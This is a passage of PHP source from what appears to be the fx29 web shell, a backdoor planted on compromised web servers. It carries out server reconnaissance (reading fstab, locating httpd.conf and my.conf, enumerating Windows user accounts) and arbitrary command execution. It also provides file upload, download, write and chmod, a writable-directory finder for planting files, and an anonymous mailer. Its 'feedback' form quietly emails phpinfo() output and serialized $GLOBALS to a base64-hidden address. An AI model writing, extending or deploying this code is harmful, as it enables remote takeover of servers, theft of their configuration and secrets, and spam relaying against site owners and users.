      dispsecinfo("Distrib Name (2)",fx29exec("cat /etc/*-realise"));

      dispsecinfo("CPU Info",fx29exec("cat /proc/cpuinfo"));

      dispsecinfo("RAM",fx29exec("free -m"));

      dispsecinfo("HDD Space",fx29exec("df -h"));

      dispsecinfo("List of Attributes",fx29exec("lsattr -a"));

      dispsecinfo("Mount Options",fx29exec("cat /etc/fstab"));

      dispsecinfo("lynx installed?",fx29exec("which lynx"));

      dispsecinfo("links installed?",fx29exec("which links"));

      dispsecinfo("GET installed?",fx29exec("which GET"));

      dispsecinfo("Where is Apache?",fx29exec("whereis apache"));

      dispsecinfo("Where is perl?",fx29exec("whereis perl"));

      dispsecinfo("Locate proftpd.conf",fx29exec("locate proftpd.conf"));

      dispsecinfo("Locate httpd.conf",fx29exec("locate httpd.conf"));

      dispsecinfo("Locate my.conf",fx29exec("locate my.conf"));

      dispsecinfo("Locate psybnc.conf",fx29exec("locate psybnc.conf"));

    }

    else {

      dispsecinfo("OS Version",fx29exec("ver"));

      dispsecinfo("Account Settings",fx29exec("net accounts"));

      dispsecinfo("User Accounts",fx29exec("net user"));

    }

    echo "</table>\n";

  }



  ##[ MAKE FILE ]##

  if ($act == "mkfile") {

    if ($mkfile != $d) {

      if ($overwrite == 0) {

        if (file_exists($mkfile)) { echo "<b>FILE EXIST:</b> $overwrite ".htmlspecialchars($mkfile); }

      }

      else {

        if (!fopen($mkfile,"w")) { echo "<b>ACCESS DENIED:</b> ".htmlspecialchars($mkfile); }

        else { $act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {

                  $d .= DIRECTORY_SEPARATOR;

                    }

                    $f = basename($mkfile);

                }

      }

    }

    else { disp_error("Enter filename!"); }

  }



  ##[ ENCODER ]##

  if ($act == "encoder") {

    if (!isset($encoder_input)) { $encoder_input = ""; }

?>

<script language="javascript"> function set_encoder_input(text) { document.forms.encoder.input.value = text; }</script>



<form name="encoder" action="<?php echo $surl; ?>" method=POST>

    <input type="hidden" name="act" value="encoder">

    <table class="contents">

        <tr><td colspan="4" class="barheader">.: Encoder :.</td></tr>

        <tr><td colspan="2">Input:</td><td><textarea name="encoder_input" id="input" cols="70" rows="5"><?php echo @htmlspecialchars($encoder_input); ?></textarea><br>

        <input type="submit" value="Calculate">

        </td></tr>

        <tr><td rowspan="4">Hashes:</td>

<?php

    foreach(array("md5","crypt","sha1","crc32") as $v) {

?>

        <td><?php echo $v; ?>:</td><td><input type="text" size="50" onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="<?php echo $v($encoder_input); ?>" readonly>

        </td></tr>

        <tr>

<?php

    }

?>

        </tr>

        <tr><td rowspan=2>Url:</td>

        <td>urlencode:</td><td><input type="text" size="35" onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="<?php echo urlencode($encoder_input); ?>" readonly>

        </td></tr>

        <tr><td>urldecode:</td><td><input type="text" size="35" onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="<?php echo htmlspecialchars(urldecode($encoder_input)); ?>" readonly>

        </td></tr>

        <tr><td rowspan=2>Base64:</td>

        <td>base64_encode:</td><td><input type="text" size="35" onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="<?php echo base64_encode($encoder_input); ?>" readonly>

        </td></tr>

        <tr><td>base64_decode:</td>

        <td>

<?php

    if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {

?>

        <input type="text" size="35" value="Failed!" disabled readonly>

<?php

    }

    else {

      $debase64 = base64_decode($encoder_input);

      $debase64 = str_replace("\0","[0]",$debase64);

      $a = explode("\r\n",$debase64);

      $rows = count($a);

      $debase64 = htmlspecialchars($debase64);

      if ($rows == 1) {

        echo "\t\t<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";

      }

      else {

        $rows++;

        echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";

      }

      echo " <a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\">[Send to input]</a>\n";

    }

    echo "\t\t</td></tr>\n".

         "\t\t<tr><td>Base convertations:</td><td>dec2hex</td><td>".

         "<input type=\"text\" size=\"35\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"\"";

    $c = strlen($encoder_input);

    for ($i=0;$i<$c;$i++) {

      $hex = dechex(ord($encoder_input[$i]));

      if ($encoder_input[$i] == "&") { echo $encoder_input[$i]; }

      elseif ($encoder_input[$i] != "\\") { echo "%".$hex; }

    }

    echo "\" readonly>\n";

?>

        </td></tr>

    </table>

</form>

<?php

  }



  ##[ FILESYSTEM BUFFER ]##

  if ($act == "fsbuff") {

    $arr_copy = $sess_data["copy"];

    $arr_cut = $sess_data["cut"];

    $arr = array_merge($arr_copy,$arr_cut);

    if (count($arr) == 0) {echo "<h2><center>Buffer is empty!</center></h2>";}

    else {

      $fx_infohead = "File-System Buffer";

      $ls_arr = $arr;

      $disp_fullpath = TRUE;

      $act = "ls";

    }

  }



  ##[ SELF REMOVE ]##

  if ($act == "selfremove") {

?>

<div class="barheader">

    .: SELF KILL :.

    <hr size="1" noshade>



<?php

    if ((@$submit == @$rndcode) && (@$submit != "")) {

      if (unlink(__FILE__)) { @ob_clean(); echo "Thanks for using ".sh_name()."!"; fx29shexit(); }

      else { disp_error("Can't delete ".__FILE__."!"); }

    }

    else {

      if (!empty($rndcode)) { disp_error("Error: Incorrect confirmation code!"); }

      $rnd = rand(0,9).rand(0,9).rand(0,9);

?>

<form name="f_killshell" action="<?php echo $surl; ?>">

    <input type="hidden" name="act" value="selfremove">

    <input type="hidden" name="rndcode" value="<?php echo $rnd; ?>">

    Are you sure want to remove this shell ?<br>

    <?php disp_error(__FILE__); ?>

    <br>For confirmation, enter "<?php echo $rnd; ?>"<br>

    <input type="text" name="submit"><br>

    <input type="submit" value="KILL">

</form>

</div>

<?php

    }

  }



  ##[ FEEDBACK ]##

  if ($act == "feedback") {

    $suppmail = base64_decode("ZmVlbGNvbXpAZ21haWwuY29t");

    if (!empty($submit)) {

      $ticket = substr(md5(microtime()+rand(1,1000)),0,6);

      $body = sh_name()." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;

      if (!empty($fdbk_ref)) {

        $tmp = @ob_get_contents();

        ob_clean();

        phpinfo();

        $phpinfo = base64_encode(ob_get_contents());

        ob_clean();

        echo $tmp;

        $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";

      }

      mail($suppmail,sh_name()." feedback #".$ticket,$body,"FROM: ".$suppmail);

      echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>";

    }

    else {

?>

<div class="barheader">.: Feedback or report bug (<?php echo str_replace(array("@","."),array("[at]","[dot]"),$suppmail); ?>) :.</div>



<form name="f_feedback" action="<?php echo $surl; ?>" method="POST">

    <input type="hidden" name="act" value="feedback">

    <table class="contents">

        <tr><th>Your name:</th><td><input type="text" name="fdbk_name" value="<?php echo htmlspecialchars(@$fdbk_name); ?>"></td</tr>

        <tr><th>Your e-mail:</th><td><input type="text" name="fdbk_email" value="<?php echo htmlspecialchars(@$fdbk_email); ?>"></td></tr>

        <tr><th>Message:</th><td><textarea name="fdbk_body" cols=80 rows=10><?php echo htmlspecialchars(@$fdbk_body); ?></textarea>

        <input type="hidden" name="fdbk_ref" value="<?php echo urlencode($HTTP_REFERER); ?>"><br>

        <input type="checkbox" name="fdbk_servinf" value="1" checked> Attach Server info (Recommended for bug-fix)</td></tr>

        <tr><td></td><td><input type="submit" name="submit" value="Send"></td></tr>

    </table>

</form>

<?php

    }

  }



  ##[ PHP MAILER (By FaTaLisTiCz_Fx) ]##

  if ($act == "fxmailer") {

?>

    <div class="barheader">.: Mailer :.</div>

<?php

    if (!empty($submit)){

      $headers  = 'To: '.$dest_email."\n";

      $headers .= 'From: '.$sender_name.' '.$sender_email."\n";

      if (mail($dest_email,$sender_subj,$sender_body,$headers)) {

        echo "<center><b>Email sent to $dest_email!</b></center>";

      }

      else { disp_error("Can't send email!"); }

    }

    else {

  ?>

<form name="f_mailer" action="<?php echo $surl; ?>" method="POST">

    <input type="hidden" name="act" value="fxmailer">

    <table class="contents">

        <tr><th>Your name:</th><td><input type="text" name="sender_name" value="<?php echo @htmlspecialchars($sender_name); ?>"></td></tr>

        <tr><th>Your e-mail:</th><td><input type="text" name="sender_email" value="<?php echo @htmlspecialchars($sender_email); ?>"></td></tr>

        <tr><th>To:</th><td><input type="text" name="dest_email" value="<?php @htmlspecialchars($dest_email); ?>"></td></tr>

        <tr><th>Subject:</th><td><input size="70" type="text" name="sender_subj" value="<?php echo @htmlspecialchars($sender_subj); ?>"></td></tr>

        <tr><th>Message:</th><td><textarea name="sender_body" cols="80" rows="10"><?php echo @htmlspecialchars($sender_body); ?></textarea></td></tr>

        <tr><th></th><td><input type="submit" name="submit" value="Send"></td></tr>

    </table>

</form>

<?php

    }

  }



  ##[ SEARCH ]##

  if ($act == "search") {

?>

<div class=barheader>.: Filesystem Search :.</div>



<?php

    if (empty($search_in)) {$search_in = $d;}

    if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}

    if (empty($search_text_wwo)) {$search_text_regexp = 0;}

    if (!empty($submit)) {

      $found = array();

      $found_d = 0;

      $found_f = 0;

      $search_i_f = 0;

      $search_i_d = 0;

      $a = array(

          "name"        => @$search_name,

          "name_regexp"    => @$search_name_regexp,

          "text"        => @$search_text,

          "text_regexp"    => @$search_text_regxp,

          "text_wwo"    => @$search_text_wwo,

          "text_cs"        => @$search_text_cs,

          "text_not"    => @$search_text_not

      );

      $searchtime = getmicrotime();

      $in = array_unique(explode(";",$search_in));

      foreach($in as $v) { fx29fsearch($v); }

      $searchtime = round(getmicrotime()-$searchtime,4);

      if (count($found) == 0) { echo "No files found!"; }

      else {

        $ls_arr = $found;

        $disp_fullpath = TRUE;

        $act = "ls";

      }

    }

?>

<form name="f_search" method="POST">

    <input type="hidden" name="d" value="<?php echo $dispd; ?>">

    <input type="hidden" name="act" value="<?php echo $dspact; ?>">

    <table class="contents">

        <tr><th>File or folder Name:</th><td><input type="text" name="search_name" size="<?php echo round(strlen($search_name)+25); ?>" value="<?php echo htmlspecialchars($search_name); ?>"> <input type="checkbox" name="search_name_regexp" value="1" <?php echo (@$search_name_regexp == 1?" checked":""); ?>> Regular Expression</td></tr>

        <tr><th>Look in (Separate by ";"):</th><td><input type="text" name="search_in" size="<?php echo round(strlen($search_in)+25); ?>" value="<?php echo htmlspecialchars($search_in); ?>"></td></tr>

        <tr><th>A word or phrase in the file:</th><td><textarea name="search_text" cols="50" rows="5"><?php echo htmlspecialchars(@$search_text); ?></textarea></td></tr>

        <tr><th></th><td>

            <input type="checkbox" name="search_text_regexp" value="1" <?php echo (@$search_text_regexp == 1?" checked":""); ?>> Regular Expression

            <input type="checkbox" name="search_text_wwo" value="1" <?php echo (@$search_text_wwo == 1?" checked":""); ?>> Whole words only

            <input type="checkbox" name="search_text_cs" value="1" <?php echo (@$search_text_cs == 1?" checked":""); ?>> Case sensitive

            <input type="checkbox" name="search_text_not" value="1" <?php echo (@$search_text_not == 1?" checked":""); ?>> Find files NOT containing the text

        </td></tr>

        <tr><th></th><td><input type="submit" name="submit" value="Search"></td></tr>

    </table>

</form>

<?php

    if ($act == "ls") {

      $dspact = $act;

      echo $searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b>\n".

           "<hr size=\"1\" noshade>\n";

    }

  }



  ##[ CHMOD]##

  if ($act == "chmod") {

    $mode = fileperms($d.$f);

    if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}

    else {

      $form = TRUE;

      if ($chmod_submit) {

        $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);

        if (chmod($d.$f,$octet)) { $act = "ls"; $form = FALSE; $err = ""; }

        else {$err = "Can't chmod to ".$octet.".";}

      }

      if ($form) {

        $perms = parse_perms($mode);

        echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b>\n".

             "<br>".($err?"<b>Error:</b> ".$err:"")."\n".

             "<form name=\"f_chmod\" action=\"".$surl."\" method=POST>\n".

             "<input type=hidden name=d value=\"".htmlspecialchars($d)."\">\n".

             "<input type=hidden name=f value=\"".htmlspecialchars($f)."\">\n".

             "<input type=hidden name=act value=chmod>\n".

             "<table><tr>\n".

             "<td><b>Owner</b><br><br>\n".

             "<input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"")."> Read<br>\n".

             "<input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"")."> Write<br>\n".

             "<input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"")."> eXecute</td>\n".

             "<td><b>Group</b><br><br>\n".

             "<input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"")."> Read<br>\n".

             "<input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"")."> Write<br>\n".

             "<input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"")."> eXecute</td>\n".

             "<td><b>World</b><br><br>\n".

             "<input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"")."> Read<br>\n".

             "<input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"")."> Write<br>\n".

             "<input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"")."> eXecute</td>\n".

             "</tr>\n".

             "<tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr>\n".

             "</table>\n".

             "</form>\n";

      }

    }

  }



  ##[ UPLOAD ]##

  if ($act == "upload") {

    $uploadmess = "";

    $uploadpath = (isset($uploadpath)) ? str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath) : $d;

    if (substr($uploadpath,-1) != DIRECTORY_SEPARATOR) { $uploadpath .= DIRECTORY_SEPARATOR; }

    if (!empty($submit)) {

      $uploadfile = $_FILES["uploadfile"];

      if (!empty($uploadfile["tmp_name"])) {

        if (empty($uploadfilename)) { $destin = $uploadfile["name"]; }

        else { $destin = $userfilename; }

        if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {

          $uploadmess .= "<div class=errmsg>Error uploading file ".$uploadfile["name"]." (Can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!</div>";

        }

        else { $uploadmess .= "File uploaded successfully!<br>".$uploadpath.$destin; }

      }

      else { $uploadmess .= "<div class=errmsg>No file to upload!</div>"; }

    }

    echo $uploadmess;

    $act = "ls";

  }



  ##{ DELETE }##

  if ($act == "delete") {

    $delerr = "";

    foreach ($actbox as $v) {

      $result = FALSE;

      $result = fs_rmobj($v);

      if (!$result) { $delerr .= "Can't delete ".htmlspecialchars($v)."<br>"; }

    }

    if (!empty($delerr)) { disp_error("Error deleting:<br>$delerr"); }

    $act = "ls";

  }



  ##[ COPY ]##

  if ($act == "copy") {

    $err = "";

    $sess_data["copy"] = array_merge($sess_data["copy"],$actbox);

    fx29_sess_put($sess_data);

    $act = "ls";

  }



  ##[ CUT ]##

  elseif ($act == "cut") {

    $sess_data["cut"] = array_merge($sess_data["cut"],$actbox);

    fx29_sess_put($sess_data);

    $act = "ls";

  }



  ##[ UNSELECT ]##

  elseif ($act == "unselect") {

    foreach ($sess_data["copy"] as $k=>$v) {

      if (in_array($v,$actbox)) { unset($sess_data["copy"][$k]); }

    }

    foreach ($sess_data["cut"] as $k=>$v) {

      if (in_array($v,$actbox)) { unset($sess_data["cut"][$k]); }

    }

    fx29_sess_put($sess_data);

    $act = "ls";

  }



  ##[ EMPTY BUFFER ]##

  if (@$actemptybuff) { $sess_data["copy"] = $sess_data["cut"] = array(); fx29_sess_put($sess_data); }



  ##[ PASTE BUFFER ]##

  elseif (@$actpastebuff) {

    $psterr = "";

    foreach($sess_data["copy"] as $k=>$v) {

      $to = $d.basename($v);

      if (!fs_copy_obj($v,$to)) { $psterr .= "Can't copy ".$v." to ".$to."!<br>"; }

      if ($copy_unset) { unset($sess_data["copy"][$k]); }

    }

    foreach($sess_data["cut"] as $k=>$v) {

      $to = $d.basename($v);

      if (!fs_move_obj($v,$to)) { $psterr .= "Can't move ".$v." to ".$to."!<br>"; }

      unset($sess_data["cut"][$k]);

    }

    fx29_sess_put($sess_data);

    if (!empty($psterr)) { disp_error("Pasting with errors:<br>$psterr"); }

    $act = "ls";

  }



  ##[ ARCHIVE BUFFER ]##

  elseif (@$actarcbuff) {

    $arcerr = "";

    if (substr($actarcbuff_path,-7,7) == ".tar.gz") { $ext = ".tar.gz"; }

    else { $ext = ".tar.gz"; }

    if ($ext == ".tar.gz") { $cmdline = "tar cfzv"; }

    $cmdline .= " ".$actarcbuff_path;

    $objects = array_merge($sess_data["copy"],$sess_data["cut"]);

    foreach($objects as $v) {

      $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);

      if (substr($v,0,strlen($d)) == $d) { $v = basename($v); }

      if (is_dir($v)) {

        if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}

        $v .= "*";

      }

      $cmdline .= " ".$v;

    }

    $tmp = realpath(".");

    chdir($d);

    $ret = fx29exec($cmdline);

    chdir($tmp);

    if (empty($ret)) { $arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>"; }

    $ret = str_replace("\r\n","\n",$ret);

    $ret = explode("\n",$ret);

    if ($copy_unset) { foreach($sess_data["copy"] as $k=>$v) { unset($sess_data["copy"][$k]); } }

    foreach($sess_data["cut"] as $k=>$v) {

      if (in_array($v,$ret)) { fs_rmobj($v); }

      unset($sess_data["cut"][$k]);

    }

    fx29_sess_put($sess_data);

    if (!empty($arcerr)) { disp_error("Archivation errors:<br>$arcerr"); }

    $act = "ls";

  }

  ##[ CMD ]##

  if ($act == "cmd") {

    @chdir($chdir);

    if (!empty($submit)) {

      echo "<div class=barheader>.: Command Output :.</div>\n";

      $olddir = realpath(".");

      @chdir($d);

      $ret = fx29exec($cmd);

      $ret = convert_cyr_string($ret,"d","w");

      if ($cmd_txt) {

        $rows = count(explode("\n",$ret))+1;

        if ($rows < 10) { $rows = 10; } else { $rows = 30; }

        $cols = 125;

        echo "<textarea class=\"shell\" cols=\"$cols\" rows=\"$rows\" readonly>".htmlspecialchars($ret)."</textarea>\n";

      }

      else { echo $ret."<br>"; }

      @chdir($olddir);

    }

  }

  ##[ PHP FILESYSTEM (By FaTaLisTiCz_Fx) ]##

  if ($act == "phpfsys") {

    echo "<div align=left>";

    $fsfunc = $phpfsysfunc;

    if ($fsfunc=="copy") {

      if (!copy($arg1, $arg2)) { echo "Failed to copy $arg1...\n";}

      else { echo "<b>Success!</b> $arg1 copied to $arg2\n"; }

    }

    elseif ($fsfunc=="rename") {

      if (!rename($arg1, $arg2)) { echo "Failed to rename/move $arg1!\n";}

      else { echo "<b>Success!</b> $arg1 renamed/moved to $arg2\n"; }

    }

    elseif ($fsfunc=="chmod") {

      if (!chmod($arg1,$arg2)) { echo "Failed to chmod $arg1!\n";}

      else { echo "<b>Perm for $arg1 changed to $arg2!</b>\n"; }

    }

    elseif ($fsfunc=="read") {

      $darg = $d.$arg1;

      if ($hasil = @file_get_contents($darg)) {

        echo "<b>Filename:</b> ".$darg."<br>";

        echo "<center><textarea cols=125 rows=30>";

        echo htmlentities($hasil);

        echo "</textarea></center>\n";

      }

      else { disp_error("Couldn't open $darg"); }

    }

    elseif ($fsfunc=="write") {

      $darg = $d.$arg1;

      if(@file_put_contents($darg,$arg2)) {

        echo "<b>Saved!</b> ".$darg;

      }

      else { disp_error("Can't write to $darg!"); }

    }

    elseif ($fsfunc=="downloadbin") {

      $handle = fopen($arg1, "rb");

      $contents = '';

      while (!feof($handle)) {

        $contents .= fread($handle, 8192);

      }

      $r = @fopen($d.$arg2,'w');

      if (fwrite($r,$contents)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }

      else { disp_error("Can't write to ".$d.$arg2."!"); }

      fclose($r);

      fclose($handle);

    }

    elseif ($fsfunc=="download") {

      $text = implode('', file($arg1));

      if ($text) {

        $r = @fopen($d.$arg2,'w');

        if (fwrite($r,$text)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }

        else { disp_error("Can't write to ".$d.$arg2."!"); }

        fclose($r);

      }

      else { disp_error("Can't download from $arg1!");}

    }

    elseif ($fsfunc=='mkdir') {

      $thedir = $d.$arg1;

      if ($thedir != $d) {

        if (file_exists($thedir)) { echo "<b>Already exists:</b> ".htmlspecialchars($thedir); }

        elseif (!mkdir($thedir)) { echo "<b>Access denied:</b> ".htmlspecialchars($thedir); }

        else { echo "<b>Dir created:</b> ".htmlspecialchars($thedir);}

      }

      else { echo "Can't create current dir:<b> $thedir</b>"; }

    }

    elseif ($fsfunc=='fwritabledir') {

      function recurse_dir($dir,$max_dir) {

        global $dir_count;

        $dir_count++;

        if( $cdir = dir($dir) ) {

          while( $entry = $cdir-> read() ) {

            if( $entry != '.' && $entry != '..' ) {

              if(is_dir($dir.$entry) && is_writable($dir.$entry) ) {

               if ($dir_count > $max_dir) { return; }

                echo "[".$dir_count."] ".$dir.$entry."\n";

                recurse_dir($dir.$entry.DIRECTORY_SEPARATOR,$max_dir);

              }

            }

          }

          $cdir->close();

        }

      }

      if (!$arg1) { $arg1 = $d; }

      if (!$arg2) { $arg2 = 10; }

      if (is_dir($arg1)) {

        echo "<b>Writable directories (Max: $arg2) in:</b> $arg1<hr noshade size=1>";

        echo "<pre>";

        recurse_dir($arg1,$arg2);

        echo "</pre>";

        $total = $dir_count - 1;

        echo "<hr noshade size=1><b>Founds:</b> ".$total." of <b>Max</b> $arg2";

      }

      else {

        disp_error("Directory is not exists or permission denied!");

      }

    }

    else {

      if (!$arg1) { disp_error("No operation! Please fill 1st parameter!"); }

      else {

        if ($hasil = $fsfunc($arg1)) {

          echo "<b>Result of $fsfunc $arg1:</b><br>";

          if (!is_array($hasil)) { echo "$hasil\n"; }

          else {

            echo "<pre>";

            foreach ($hasil as $v) { echo $v."\n"; }

            echo "</pre>";

          }

        }

        else { disp_error("$fsfunc $arg1 failed!"); }

      }

    }

    echo "</div>\n";

  }



  ##[ DIRECTORY LIST ]##

  if ($act == "ls") {

    if (count($ls_arr) > 0) { $list = $ls_arr; }

    else {

      $list = array();

      if ($h = @opendir($d)) {

        while (($o = readdir($h)) !== FALSE) { $list[] = $d.$o; }

        closedir($h);

      }

    }

    if (count($list) == 0) {

      disp_error("No such directory or access denied!<br>".htmlspecialchars($d));

    }

    else {

      $objects = array();

      $vd = "f"; #Viewing mode

      if ($vd == "f") {

        $objects["head"] = array();

        $objects["folders"] = array();

        $objects["links"] = array();

        $objects["files"] = array();

        foreach ($list as $v) {

          $o = basename($v);

          $row = array();

          if ($o == ".") { $row[] = $d.$o; $row[] = "CURDIR"; }

          elseif ($o == "..") { $row[] = $d.$o; $row[] = "DIR"; }

          elseif (is_dir($v)) {

            if (is_link($v)) { $type = "LINK"; }

            else { $type = "DIR"; }

            $row[] = $v;

            $row[] = $type;

          }

          elseif(is_file($v)) { $row[] = $v; $row[] = filesize($v); }

          $row[] = filemtime($v);

          if (!is_windows()) {

            $ow = posix_getpwuid(fileowner($v));

            $gr = posix_getgrgid(filegroup($v));

            $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));

          }

          $row[] = fileperms($v);

          if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}

          elseif (is_link($v)) { $objects["links"][] = $row; }

          elseif (is_dir($v)) { $objects["folders"][] = $row; }

          elseif (is_file($v)) { $objects["files"][] = $row; }

          $i++;

        }

        $row = array();

        $row[] = "<b>Name</b>";

        $row[] = "<b>Size</b>";

        $row[] = "<b>Date Modified</b>";

        if (!is_windows()) {$row[] = "<b>Owner/Group</b>";}

        $row[] = "<b>Perms</b>";

        $row[] = "<b>Action</b>";

        $parsesort = parsesort($sort);

        $sort = $parsesort[0].$parsesort[1];

        $k = $parsesort[0];

        if ($parsesort[1] != "a") {$parsesort[1] = "d";}

        $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";

        $y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" alt=\"".($parsesort[1] == "a"?"Asc":"Desc")."\"></a>";

        $row[$k] .= $y;

        for($i=0;$i<count($row)-1;$i++) {

          if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}

        }

        $v = $parsesort[0];

        usort($objects["folders"], "tabsort");

        usort($objects["links"], "tabsort");

        usort($objects["files"], "tabsort");

        if ($parsesort[1] == "d") {

          $objects["folders"] = array_reverse($objects["folders"]);

          $objects["files"] = array_reverse($objects["files"]);

        }

        $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);

        $tab = array();

        $tab["cols"] = array($row);

        $tab["head"] = array();

        $tab["folders"] = array();

        $tab["links"] = array();

        $tab["files"] = array();

        $i = 0;

        foreach ($objects as $a) {

          $v = $a[0];

          $o = basename($v);

          $dir = dirname($v);

          if ($disp_fullpath) { $disppath = $v; }

          else { $disppath = $o; }

          $disppath = str2mini($disppath,60);

          if (in_array($v,$sess_data["cut"])) { $disppath = "<strike>".$disppath."</strike>"; }

          elseif (in_array($v,$sess_data["copy"])) { $disppath = "<u>".$disppath."</u>"; }

          foreach ($regxp_highlight as $r) {

            if ( ereg($r[0],strtolower($o)) ) {

              if ((!is_numeric($r[1])) or ($r[1] > 3)) {

                $r[1] = 0;

                @ob_clean();

                disp_error("Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command.");

                fx29shexit();

              }

              else {

                $r[1] = round($r[1]);

                $isdir = is_dir($v);

                if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) {

                  if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}

                  $disppath = $r[2].$disppath.$r[3];

                  if (isset($r[4])) { break; }

                }

              }

            }

          }

          $uo = urlencode($o);

          $ud = urlencode($dir);

          $uv = urlencode($v);

          $row = array();

          if ($o == ".") {

            $row[] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."act=img&img=small_dir\" alt=\"\"> ".$o."</a>";

            $row[] = "CURDIR";

          }

          elseif ($o == "..") {

            $row[] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."act=img&img=ext_lnk\" alt=\"\"> ".$o."</a>";

            $row[] = "UPDIR";

          }

          elseif (is_dir($v)) {

            if (is_link($v)) {

              $disppath .= " => ".readlink($v);

              $type = "LNK";

              $row[] = "<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."act=img&img=ext_lnk\" alt=\"\"> [".$disppath."]</a>";

            }

            else {

              $type = "DIR";

              $row[] =  "<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."act=img&img=small_dir\" alt=\"\"> [".$disppath."]</a>";

            }

            $row[] = $type;

          }

          elseif(is_file($v)) {

            $ext = explode(".",$o);

            $c = count($ext)-1;

            $ext = $ext[$c];

            $ext = strtolower($ext);

            $row[] =  "<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_".$ext."\" alt=\"\"> ".$disppath."</a>";

            $row[] = view_size($a[1]);

          }

          $row[] = @date("d.m.Y H:i:s",$a[2]);

          if (!is_windows()) { $row[] = $a[3]; }

          $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";



          if ($o == ".") {

            $checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">";

            $i--;

          }

          else {

            $checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";

          }



          if (is_dir($v)) {

            $row[] = "$checkbox <a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\"></a> ";

          }

          else {

            $row[] = "$checkbox ".

                     "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\"></a> ".

                     "<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\"></a> ".

                     "<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\"></a>";

          }



          if (($o == ".") or ($o == "..")) { $tab["head"][] = $row; }

